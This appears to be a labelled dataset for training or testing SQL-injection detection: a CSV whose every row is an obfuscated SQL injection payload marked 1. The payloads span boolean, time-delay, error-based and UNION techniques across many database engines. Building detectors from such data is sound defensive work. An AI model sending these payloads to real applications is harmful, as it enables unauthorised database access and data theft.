Query,Label
"1'||  (  s/**/elect 'gwxc' fro/**/m dual wh/**/ere 3626  =  3626 an/**/d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
-5534 o/**/r 1983  =  5721#,1
1'   )    )    as grne wher/**/e 9003  =  9003 o/**/r/**/der b/**/y 1--,1
"1"" an/**/d char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nu/**/ll  )   an/**/d ""wrbs"" lik/**/e ""wrbs",1
"1""   )    )    as hkrh whe/**/re 3060  =  3060 o/**/r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nu/**/ll  )  --",1
"1'  )   a/**/nd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nu/**/ll  )   a/**/nd   (  'rqyz'  =  'rqyz",1
"-5439"" o/**/r 2559  =  4692 a/**/nd ""dcrf"" l/**/ike ""dcrf",1
"1""  )   as kndn wh/**/ere 9314  =  9314",1
-6030%'  )   o/**/r 3038  =  3038,1
"1   (  selec/**/t   (  case when   (  5451  =  5451  )   then regexp_substri/**/ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nul/**/l  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   f/**/rom i/**/nfo/**/rmation_schema.system_users  )  ",1
"1 a/**/nd 8407  =    (  sele/**/ct count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )   # tqmr",1
1   )    )    as tnhy w/**/here 1874  =  1874 an/**/d 2858  =  7324#,1
-1910' o/**/r 2624  =  3371 an/**/d 'umoy'  =  'umoy,1
-7293'   )    )     )   o/**/r 3038  =  3038,1
"sel/**/ect sleep  (  5  )   a/**/nd   (  ""%""  =  """,1
"1 wh/**/ere 3410  =  3410 o/**/r 7552  =    (  sele/**/ct count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'   )    )    a/**/nd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1  )   a/**/nd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    an/**/d   (  6786  =  6786",1
"sele/**/ct count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.t/**/ables as t3#",1
"1%""   )    )    union all sele/**/ct nu/**/ll,nul/**/l,nu/**/ll,n/**/ull,nul/**/l,n/**/ull,nul/**/l,n/**/ull,nu/**/ll#",1
"1'   )    )    as lmsl whe/**/re 3753  =  3753 o/**/r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1""   )    )     )   o/**/r elt  (  6272  =  6272,sleep  (  5   )    )    an/**/d    (    (     (  ""hxgu""  =  ""hxgu",1
1'  )   as twny whe/**/re 9580  =  9580,1
"-7738%""  )   union all selec/**/t 8754,8754,8754,8754,8754,8754,8754,8754,8754#",1
"1'   )    )     )    (  sel/**/ect   (  case when   (  5451  =  5451  )   then regexp_substri/**/ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,n/**/ull  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   f/**/rom i/**/nfo/**/rmation_schema.system_users  )   a/**/nd    (    (     (  'bvdw'  =  'bvdw",1
"1"" o/**/r up/**/datexml  (  1808,concat  (  0x2e,0x7171706a71,  (  selec/**/t   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1
"-3884"" whe/**/re 8012  =  8012 union all se/**/lect 8012,8012#",1
"1"" a/**/nd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selec/**/t   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    an/**/d ""eiuc"" li/**/ke ""eiuc",1
sel/**/ect sleep  (  5  )   an/**/d    (    (   'srfc' li/**/ke 'srfc,1
1  )   waitfo/**/r delay '0:0:5' an/**/d   (  2993  =  2993,1
"1""  )   whe/**/re 1666  =  1666 o/**/r 4411  =    (  se/**/lect count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1""   )    )   ",1
"-5572""  )   union all se/**/lect 8131,8131#",1
"1 whe/**/re 2823  =  2823 a/**/nd 3707  =    (  sele/**/ct count  (  *  )   fro/**/m sysibm.systab/**/les as t1,sysibm.syst/**/ables as t2,sysibm.systabl/**/es as t3  )  --",1
1' i/**/n boolean mode  )   a/**/nd 6969  =    (  s/**/elect 6969 fro/**/m pg_sleep  (  5   )    )   #,1
-3026  )   o/**/r 4493  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1
"1%"" a/**/nd elt  (  4249  =  4249,7259  )   a/**/nd ""%""  =  """,1
1' w/**/here 2389  =  2389 an/**/d 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selec/**/t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1  )   w/**/here 6788  =  6788 union all selec/**/t nu/**/ll,nu/**/ll,nul/**/l,nu/**/ll,nul/**/l,nu/**/ll,nul/**/l,n/**/ull,n/**/ull--",1
-2912'   )    )    o/**/rde/**/r b/**/y 1--,1
"s/**/elect count  (  *  )   fro/**/m sysibm.systab/**/les as t1,sysibm.systab/**/les as t2,sysibm.systabl/**/es as t3",1
"1"" union all sel/**/ect nul/**/l,nu/**/ll,n/**/ull,n/**/ull,n/**/ull#",1
"s/**/elect count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
sele/**/ct sleep  (  5  )  -- hlgt,1
"1'   )    )     )    (  s/**/elect   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nul/**/l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   fro/**/m   (  v/**/alues  (  0   )    )     )   a/**/nd    (    (     (  'sqnk'  =  'sqnk",1
"1'   )    )    as ytfi whe/**/re 3323  =  3323 a/**/nd 8148  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   --",1
"-4091   )    )    as lqqy whe/**/re 3030  =  3030 union all s/**/elect 3030,3030,3030#",1
"1',  (  se/**/lect   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  sel/**/ect 8596 fr/**/om mysql.db  )   end   )    )   ",1
1'   )    )     )   a/**/nd 6240  =    (  'qqpjq'||  (  sel/**/ect case 6240 when 6240 then 1 else 0 end fr/**/om rdb$data/**/base  )  ||'qzvzq'  )   a/**/nd    (    (     (  'snoa'  =  'snoa,1
"1"" wher/**/e 9014  =  9014 a/**/nd 6969  =    (  s/**/elect 6969 fro/**/m pg_sleep  (  5   )    )   --",1
selec/**/t case when 8227  =  1229 then 1 else nul/**/l end--,1
-8465' wher/**/e 5242  =  5242 o/**/r 3806  =  7423--,1
"-1949""   )    )    as urke w/**/here 8761  =  8761 union all s/**/elect 8761,8761,8761,8761,8761,8761,8761#",1
"1'   )    )    as uuuk wher/**/e 7234  =  7234 a/**/nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
1'  )   as mqxb wh/**/ere 6496  =  6496 an/**/d 7533  =  7533--,1
"1%' union all sel/**/ect nul/**/l,nu/**/ll,n/**/ull,n/**/ull,nu/**/ll,nu/**/ll,n/**/ull,nul/**/l--",1
1'  )   wh/**/ere 4298  =  4298,1
"-5417 o/**/r elt  (  1032  =  1032,3623  )  ",1
"1' o/**/r 7552  =    (  sele/**/ct count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   a/**/nd 'ynpr'  =  'ynpr",1
"-9978"" o/**/r make_s/**/et  (  4893  =  9765,9765  )   a/**/nd ""mhjt""  =  ""mhjt",1
"-7501'+  (  sel/**/ect uloc whe/**/re 3089  =  3089 union all selec/**/t 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",1
"1'||  (  sel/**/ect 'iocs' wher/**/e 9287  =  9287 an/**/d 8407  =    (  s/**/elect count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )     )  ||'",1
"1   )    )    as khvx wh/**/ere 7533  =  7533 union all sele/**/ct n/**/ull,n/**/ull,nul/**/l,n/**/ull,n/**/ull,nu/**/ll,nul/**/l,nul/**/l--",1
"1' i/**/n boolean mode  )   a/**/nd 9660  =    (  sel/**/ect count  (  *  )   f/**/rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""  )   as jtou w/**/here 8129  =  8129 a/**/nd 7533  =  7533--",1
1  )   whe/**/re 6494  =  6494,1
"se/**/lect count  (  *  )   fro/**/m generate_series  (  1,5000000  )   an/**/d 'dfwj'  =  'dfwj",1
"1'+  (  sel/**/ect luwn w/**/here 1214  =  1214 union all se/**/lect nu/**/ll,nul/**/l,n/**/ull,nul/**/l,n/**/ull,n/**/ull#",1
1%'   )    )     )   an/**/d 2006  =  2006,1
"-7235""  )   union all sele/**/ct 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",1
"-3756'  )   union all sel/**/ect 1034,1034,1034--",1
se/**/lect sleep  (  5  )   an/**/d 'gajm'  =  'gajm,1
"1""   )    )     )   o/**/r   (  sele/**/ct 2*  (  if   (    (   se/**/lect * fr/**/om   (  se/**/lect concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d    (    (     (  ""twpn"" li/**/ke ""twpn",1
"1""   )    )    o/**/r 4411  =    (  selec/**/t count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   an/**/d    (    (   ""wdye"" li/**/ke ""wdye",1
"1',  (  se/**/lect   (  case when   (  3902  =  3902  )   then   (  sele/**/ct count  (  *  )   f/**/rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  se/**/lect 0 fr/**/om dual  )   end  )   fro/**/m dual  )  ",1
-3956'  )   o/**/r   (  8459  =  8459  )  *4906 a/**/nd   (  'rflo' lik/**/e 'rflo,1
"1,iif  (  1440  =  4612,1,1/0  )  ",1
1'   )    )     )   an/**/d 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selec/**/t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   a/**/nd    (    (     (  'gegg'  =  'gegg,1
"1%""   )    )    o/**/r 7417  =    (  selec/**/t count  (  *  )   fr/**/om sysibm.systabl/**/es as t1,sysibm.syst/**/ables as t2,sysibm.systabl/**/es as t3  )  --",1
"1""   )    )    as uzvu wher/**/e 2458  =  2458 o/**/r   (  s/**/elect 9173 fro/**/m  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fr/**/om i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )  --",1
"1%'  )   a/**/nd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1 union all se/**/lect n/**/ull,n/**/ull,n/**/ull,nul/**/l,nu/**/ll,nul/**/l#",1
"s/**/elect count  (  *  )   f/**/rom generate_series  (  1,5000000  )   a/**/nd    (    (     (  'wvzw'  =  'wvzw",1
"1'  )   o/**/r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1
1'+  (  selec/**/t 'yjpp' wher/**/e 8966  =  8966,1
"1%""  )   o/**/r 4411  =    (  se/**/lect count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   a/**/nd   (  ""%""  =  """,1
"-8266%'  )   union all sel/**/ect 8626,8626,8626,8626,8626,8626--",1
"1%'   )    )     )   a/**/nd 9660  =    (  sele/**/ct count  (  *  )   fr/**/om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-2787' union all sel/**/ect 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1
"-6359""   )    )    o/**/r elt  (  3546  =  2433,2433  )   an/**/d    (    (   ""qxat""  =  ""qxat",1
"1""  )   an/**/d extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sele/**/ct   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    an/**/d   (  ""rfpq""  =  ""rfpq",1
1   )    )     )   a/**/nd 6358  =  6735,1
1'   )    )    as cimd w/**/here 9608  =  9608,1
"1'  )   as kgnd wh/**/ere 1550  =  1550 a/**/nd 3202  =  lik/**/e  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   --",1
1'+  (  selec/**/t 'sbji' whe/**/re 7989  =  7989 rli/**/ke   (  s/**/elect * fro/**/m   (  s/**/elect  (  sleep  (  5   )    )     )  sgvo   )    )   +',1
-9690 union all se/**/lect 7217#,1
"1 an/**/d exp  (  ~  (  se/**/lect * fr/**/om   (  se/**/lect concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",1
"1' o/**/r 8315  =    (  selec/**/t count  (  *  )   fr/**/om sysibm.systab/**/les as t1,sysibm.systa/**/bles as t2,sysibm.syst/**/ables as t3  )   a/**/nd 'eomt'  =  'eomt",1
"1'  )   o/**/r exp  (  ~  (  selec/**/t * f/**/rom   (  s/**/elect concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    a/**/nd   (  'thce'  =  'thce",1
1'   )    )     )   an/**/d   (  se/**/lect * fr/**/om   (  sel/**/ect  (  sleep  (  5   )    )     )  fzno  )   an/**/d    (    (     (  'lajk'  =  'lajk,1
1'  )   wher/**/e 1212  =  1212,1
"1'||  (  selec/**/t 'ggfx' wher/**/e 4932  =  4932 o/**/r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",1
1'   )    )     )   a/**/nd   (  1685  =  2985  )  *2985 an/**/d    (    (     (  'rzwb'  =  'rzwb,1
"1""  )   as yecj wh/**/ere 1194  =  1194 an/**/d 8407  =    (  s/**/elect count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )   --",1
"-5411%""   )    )    o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sel/**/ect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd    (    (   ""%""  =  """,1
"1%' an/**/d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,n/**/ull  )   a/**/nd '%'  =  '",1
"1""  )   as crek wher/**/e 6570  =  6570 a/**/nd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )  --",1
"-6084""   )    )    union all sel/**/ect 7354,7354,7354,7354,7354,7354,7354,7354#",1
"1"" o/**/r 6793  =    (  s/**/elect 6793 fro/**/m pg_sleep  (  5   )    )    an/**/d ""kojr""  =  ""kojr",1
-4191  )   o/**/r/**/der b/**/y 1#,1
"1""  )   wh/**/ere 6632  =  6632 o/**/r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
"1""   )    )    waitfo/**/r delay '0:0:5' a/**/nd    (    (   ""witb""  =  ""witb",1
1  )   as xylu whe/**/re 3338  =  3338 rli/**/ke   (  selec/**/t * f/**/rom   (  s/**/elect  (  sleep  (  5   )    )     )  sgvo  )  --,1
-2707'   )    )     )   o/**/r   (  8459  =  8459  )  *4906 an/**/d    (    (     (  'mwdq'  =  'mwdq,1
1  )   w/**/here 8375  =  8375,1
1' i/**/n boolean mode  )   an/**/d 3715 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selec/**/t   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #,1
1' o/**/r/**/der b/**/y 1--,1
sele/**/ct case when 3920  =  4402 then 1 else nul/**/l end--,1
1'   )    )     )   an/**/d 5615  =  5458--,1
"-8810'  )   o/**/r make_s/**/et  (  9354  =  9354,7185  )   a/**/nd   (  'prsn' l/**/ike 'prsn",1
"-5706""   )    )    union all sele/**/ct 2013,2013,2013,2013#",1
1'  )   whe/**/re 9159  =  9159,1
"-7860'   )    )     )   union all s/**/elect 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",1
"-3546%"" o/**/r 5903  =    (  'qqpjq'||  (  se/**/lect case 5903 when 5903 then 1 else 0 end f/**/rom rdb$databa/**/se  )  ||'qzvzq'  )   a/**/nd ""%""  =  """,1
1'  )   wh/**/ere 2928  =  2928,1
"1""   )    )    as ajwe whe/**/re 1153  =  1153 rlik/**/e   (  s/**/elect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1
"1%'   )    )    o/**/r 9643  =    (  s/**/elect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3  )   a/**/nd    (    (   '%'  =  '",1
-9668'   )    )    as o/**/rfu w/**/here 5822  =  5822 o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sele/**/ct   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
-2648'  )   o/**/r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel/**/ect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd   (  'sawt'  =  'sawt,1
s/**/elect   (  case when   (  2140  =  5325  )   then 2140 else 2140*  (  sel/**/ect 2140 fr/**/om i/**/nfo/**/rmation_schema.character_s/**/ets  )   end  )  #,1
selec/**/t   (  case when   (  1123  =  9550  )   then 1123 else 1123*  (  sel/**/ect 1123 fr/**/om i/**/nfo/**/rmation_schema.character_se/**/ts  )   end  )  #,1
"-9140""   )    )    union all s/**/elect 1623,1623,1623,1623,1623,1623,1623,1623,1623#",1
"-1597"" union all s/**/elect 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",1
-4669  )   o/**/r 2452  =  1601#,1
1%'  )   a/**/nd 6240  =    (  'qqpjq'||  (  s/**/elect case 6240 when 6240 then 1 else 0 end fro/**/m rdb$databa/**/se  )  ||'qzvzq'  )   an/**/d   (  '%'  =  ',1
1'   )    )     )   rlik/**/e sleep  (  5  )   an/**/d    (    (     (  'rozr' l/**/ike 'rozr,1
"-7122""  )   union all se/**/lect 4002,4002,4002,4002,4002,4002,4002,4002#",1
"-3460%""   )    )     )   o/**/r 9323  =  9323#",1
sele/**/ct   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  sele/**/ct 4666 fro/**/m master..sysda/**/tabases  )   end  )  --,1
"1'   )    )    as mdtm wher/**/e 1393  =  1393 an/**/d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n/**/ull  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
-8057'   )    )    as gpue w/**/here 4205  =  4205 o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sele/**/ct   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1"" o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1
1'+  (  selec/**/t eluw wh/**/ere 6210  =  6210,1
"1  )   o/**/r u/**/pdatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  se/**/lect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1
"-5217'||  (  s/**/elect 'juen' fro/**/m dual wh/**/ere 7336  =  7336 union all sel/**/ect 7336,7336,7336--",1
1'   )    )    as egsj wh/**/ere 3447  =  3447,1
"1""  )   as ssbz wh/**/ere 8885  =  8885 union all selec/**/t nu/**/ll,nu/**/ll,n/**/ull,nu/**/ll,nu/**/ll,n/**/ull,nu/**/ll,nul/**/l,nul/**/l--",1
-6298' o/**/r 4724  =  4876,1
"se/**/lect sleep  (  5  )   a/**/nd    (    (     (  ""wucy"" lik/**/e ""wucy",1
-1802' o/**/r 7931  =  5841--,1
"sel/**/ect li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )    a/**/nd    (    (     (  'teng' li/**/ke 'teng",1
"1 union all sel/**/ect n/**/ull,nul/**/l,nul/**/l,n/**/ull,nu/**/ll#",1
"1',  (  sele/**/ct   (  case when   (  1902  =  5536  )   then 1 else 1902*  (  s/**/elect 1902 f/**/rom master..sysdatabas/**/es  )   end   )    )   ",1
"-1390%""   )    )    union all s/**/elect 8930,8930,8930,8930,8930#",1
"1 whe/**/re 1992  =  1992 union all sel/**/ect nu/**/ll,nu/**/ll--",1
"1"" a/**/nd 5205  =  9975#",1
"1' an/**/d 3707  =    (  s/**/elect count  (  *  )   fr/**/om sysibm.systab/**/les as t1,sysibm.systa/**/bles as t2,sysibm.syst/**/ables as t3  )  ",1
-4057'  )   o/**/r/**/der b/**/y 1#,1
"-8929%'  )   union all sele/**/ct 9486,9486,9486,9486#",1
"-3462   )    )    as biyl wh/**/ere 5143  =  5143 union all se/**/lect 5143,5143,5143--",1
"-2570"" o/**/r 1570  =  convert  (  i/**/nt,  (  se/**/lect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se/**/lect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd ""dmch"" li/**/ke ""dmch",1
